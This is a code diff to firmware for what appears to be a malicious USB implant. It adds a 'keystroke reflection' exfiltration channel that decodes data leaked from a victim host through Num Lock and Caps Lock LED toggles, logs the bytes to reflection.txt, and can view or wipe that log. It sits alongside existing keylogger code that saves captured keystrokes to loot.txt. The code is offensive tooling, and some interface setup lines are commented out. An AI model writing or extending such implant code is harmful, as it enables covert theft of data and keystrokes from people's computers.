@@ -18,6 +18,11 @@
 #define SHIFT   (0x80)
 #define ALTGR   (0x40)
 
+#define BIT_CHANGED(a, b, mask) (((a) ^ (b)) & (mask))
+#define LED_NUM_LOCK (1 << 0)
+#define LED_CAPS_LOCK (1 << 1)
+#define LED_SCROLL_LOCK (1 << 2)
+
 extern const uint8_t _asciimap[] PROGMEM;
 
 // USB Host object
@@ -32,6 +37,14 @@ uint8_t key;
 uint8_t tmp_key;
 int key_layout;
 int key_modifier_layout;
+uint8_t leds = 0;
+uint8_t last_leds = 0;
+uint8_t c_i = 0;
+uint8_t c = 0;
+
+// KEYSTROKE REFLECTION EXFIL 
+uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
+//Adafruit_USBD_HID usb_hid_reflection(desc_hid_report_reflection, sizeof(desc_hid_report_reflection), 2, false);
 
 void setup() {
   Serial.begin(115200);
@@ -45,6 +58,11 @@ void setup() {
 
   if (USBHOST_MOUSE) {
     Mouse.begin();
+  }
+
+  if (KEYSTROKE_REFLECTION) {
+    //usb_hid_reflection.setReportCallback(NULL, hid_report_callback);
+    //usb_hid_reflection.begin();
   }
   
   Keyboard.begin();
@@ -72,6 +90,18 @@ void setup() {
     }
   }
 
+  if (REFLECTION_VIEWLOG) {
+    delay(10000);
+    File i = LittleFS.open("reflection.txt", "r");
+    Serial.println("REFLECTION.TXT FILE:");
+    if (i) {
+      while (i.available()) {
+        Serial.write(i.read());
+      }
+      i.close();
+    }
+  }
+
   if (KEYLOGGER_DELETELOG) {
     delay(5500);
     File i = LittleFS.open("loot.txt", "w");
@@ -79,6 +109,17 @@ void setup() {
     if (i) {
       i.write("");
       Serial.println("KEYLOGGER DELETELOG: OK");
+      i.close();
+    }
+  }
+
+  if (REFLECTION_DELETELOG) {
+    delay(5500);
+    File i = LittleFS.open("reflection.txt", "w");
+    
+    if (i) {
+      i.write("");
+      Serial.println("REFLECTION DELETELOG: OK");
       i.close();
     }
   }
@@ -143,6 +184,46 @@ void loop1() {
   if (KEYLOGGER || USBHOST_MOUSE) {
     USBHost.task();    
   }
+}
+
+void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize) {
+  if (stage == 2) {
+    if (report_type == HID_REPORT_TYPE_OUTPUT) {
+      leds = buffer[0];
+      exfilReflection();
+    }
+  }
+  else if(stage == 1) {
+    if (report_type == HID_REPORT_TYPE_OUTPUT) {
+      leds = buffer[0];
+    }
+  }
+}
+
+void exfilReflection() { 
+  if (BIT_CHANGED(last_leds, leds, LED_NUM_LOCK)) {
+    c <<= 1;
+    c |= 1;
+    c_i++;
+  }
+  
+  else if (BIT_CHANGED(last_leds, leds, LED_CAPS_LOCK)) {
+    c <<= 1;
+    c |= 0;
+    c_i++;
+  }
+
+  if (c_i == 8) {
+    Serial.write(c);
+    File f = LittleFS.open("reflection.txt", "a");
+      if (f) {
+        f.write(c);
+        f.close();
+      }
+    c_i = 0;
+    c = 0;
+  }
+  last_leds = leds;
 }
 
 void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
